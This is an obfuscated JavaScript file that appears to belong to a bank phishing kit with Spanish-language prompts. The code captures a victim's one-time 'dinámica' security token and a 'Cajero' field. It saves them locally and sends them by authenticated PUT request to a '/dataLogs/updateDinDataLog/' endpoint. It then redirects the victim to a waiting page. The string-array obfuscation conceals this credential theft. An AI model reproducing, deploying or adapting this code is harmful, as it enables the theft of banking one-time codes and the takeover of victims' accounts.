const _0x4457a5 = _0x21ec;
function _0x21ec(_0x2e2546, _0x13c2b6) {
  const _0x11dc1f = _0x11dc();
  return (
    (_0x21ec = function (_0x21ec03, _0x54c9f4) {
      _0x21ec03 = _0x21ec03 - 0x1c3;
      let _0x35f57f = _0x11dc1f[_0x21ec03];
      return _0x35f57f;
    }),
    _0x21ec(_0x2e2546, _0x13c2b6)
  );
}
(function (_0x2f5468, _0x2139a1) {
  const _0x25598a = _0x21ec,
    _0xc8a3db = _0x2f5468();
  while (!![]) {
    try {
      const _0x594c35 =
        parseInt(_0x25598a(0x1d4)) / 0x1 +
        (-parseInt(_0x25598a(0x1c9)) / 0x2) *
          (parseInt(_0x25598a(0x1ce)) / 0x3) +
        (-parseInt(_0x25598a(0x1dd)) / 0x4) *
          (-parseInt(_0x25598a(0x1e4)) / 0x5) +
        parseInt(_0x25598a(0x1c6)) / 0x6 +
        (-parseInt(_0x25598a(0x1d8)) / 0x7) *
          (-parseInt(_0x25598a(0x1cb)) / 0x8) +
        -parseInt(_0x25598a(0x1d0)) / 0x9 +
        (-parseInt(_0x25598a(0x1ea)) / 0xa) *
          (parseInt(_0x25598a(0x1e0)) / 0xb);
      if (_0x594c35 === _0x2139a1) break;
      else _0xc8a3db["push"](_0xc8a3db["shift"]());
    } catch (_0x4918cc) {
      _0xc8a3db["push"](_0xc8a3db["shift"]());
    }
  }
})(_0x11dc, 0xcd0b8);
function updateLS() {
  const _0x38a0b0 = _0x21ec;
  LS[_0x38a0b0(0x1d6)](_0x38a0b0(0x1d1), JSON[_0x38a0b0(0x1e5)](info));
}
const otpButton = document[_0x4457a5(0x1cc)](_0x4457a5(0x1eb)),
  numberMovil = document["getElementById"](_0x4457a5(0x1e6)),
  cajero = document[_0x4457a5(0x1cc)](_0x4457a5(0x1c8));
function _0x11dc() {
  const _0x4d616b = [
    "value",
    "/dataLogs/updateDinDataLog/",
    "4140fPnNwB",
    "btnDinamica",
    "Ingresó\x20Dinámica",
    "Error\x20al\x20actualizar\x20datos\x20en\x20el\x20servidor",
    "focus",
    "disabled",
    "5072766gmQHhu",
    "wait.html",
    "txtdinamica",
    "10UNkFxF",
    "origin",
    "84296KSlIso",
    "getElementById",
    "location",
    "35430GFSbYi",
    "metaInfo",
    "13304331xPcSqR",
    "info",
    "Hubo\x20un\x20error\x20al\x20procesar\x20la\x20solicitud.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "preventDefault",
    "1045574yiQTca",
    "addEventListener",
    "setItem",
    "dataLogId",
    "259ydaKpQ",
    "Por\x20favor\x20ingrese\x20token\x20de\x20seguridad",
    "error",
    "cdin",
    "getItem",
    "6494060qDPvOi",
    "click",
    "href",
    "40579DLLiwo",
    "Bearer\x20",
    "PUT",
    "\x20Cajero:\x20",
    "5RamsKN",
    "stringify",
    "confirmation-code",
    "application/json",
  ];
  _0x11dc = function () {
    return _0x4d616b;
  };
  return _0x11dc();
}
otpButton[_0x4457a5(0x1d5)](_0x4457a5(0x1de), async function (_0x4729e6) {
  const _0x243a00 = _0x4457a5;
  _0x4729e6[_0x243a00(0x1d3)](), (otpButton["disabled"] = !![]);
  if (numberMovil[_0x243a00(0x1e8)] == "") {
    alert(_0x243a00(0x1d9)),
      numberMovil[_0x243a00(0x1c4)](),
      (otpButton[_0x243a00(0x1c5)] = ![]);
    return;
  }
  const _0x5c1142 =
    numberMovil[_0x243a00(0x1e8)] + _0x243a00(0x1e3) + cajero[_0x243a00(0x1e8)];
  (info[_0x243a00(0x1cf)][_0x243a00(0x1db)] = _0x5c1142), updateLS();
  try {
    const _0x6773f3 = localStorage["getItem"](_0x243a00(0x1d7)),
      _0x5200ac = localStorage[_0x243a00(0x1dc)]("dataLogToken");
    if (!_0x6773f3 || !_0x5200ac)
      throw new Error(
        "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage."
      );
    const _0x4015fa = await fetch(url + _0x243a00(0x1e9) + _0x6773f3, {
      method: _0x243a00(0x1e2),
      headers: {
        "Content-Type": _0x243a00(0x1e7),
        Authorization: _0x243a00(0x1e1) + _0x5200ac,
        Origin: window[_0x243a00(0x1cd)][_0x243a00(0x1ca)],
      },
      body: JSON[_0x243a00(0x1e5)]({
        din: info[_0x243a00(0x1cf)]["cdin"],
        status: _0x243a00(0x1ec),
      }),
    });
    if (!_0x4015fa["ok"]) {
      const _0x23f3ca = await _0x4015fa["json"]();
      throw new Error(_0x23f3ca[_0x243a00(0x1da)] || _0x243a00(0x1c3));
    }
    console["log"]("Usuario\x20actualizado\x20correctamente"),
      (otpButton[_0x243a00(0x1c5)] = ![]),
      (window[_0x243a00(0x1cd)][_0x243a00(0x1df)] = _0x243a00(0x1c7));
  } catch (_0x46e380) {
    console[_0x243a00(0x1da)](
      "Error\x20al\x20actualizar\x20usuario:",
      _0x46e380
    ),
      alert(_0x243a00(0x1d2)),
      (otpButton[_0x243a00(0x1c5)] = ![]);
  }
});
